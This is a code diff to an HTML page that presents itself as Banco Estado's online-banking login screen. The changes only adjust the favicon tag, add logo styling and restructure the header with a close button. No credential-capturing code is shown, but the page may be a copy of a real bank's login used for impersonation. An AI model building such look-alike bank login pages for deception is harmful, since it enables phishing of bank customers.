@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="shortcut icon" type="image/png" href="favicon.png"/>
+    <link rel="shortcut icon" type="image/png" href="favicon.png">
     <title>Banco Estado</title>
     <style>
         * {
@@ -270,18 +270,36 @@
                 font-size: 16px;
             }
         }
+
+        .logo-img {
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: none;
+    border: none;
+    padding: 0;
+}
+
+.logo-img img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+}
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header con Logo y Botón Cerrar -->
-        <div class="header">
-            <div class="logo-container">
-                <img src="logo-banco-estado.svg" class="logo">
+    <!-- Header con Logo y Botón Cerrar -->
+    <div class="header">
+        <div class="logo-container">
+            <div class="logo-img">
+                <img src="logo-banco-estado.svg" alt="Logo">
             </div>
-            </div>
-            <button class="close-btn" onclick="closeWindow()" title="Cerrar">✕</button>
         </div>
+        <button class="close-btn" onclick="closeWindow()" title="Cerrar">✕</button>
+    </div>
 
         <!-- Título -->
         <h1 class="title">Ingresa a tu Banca en Línea</h1>
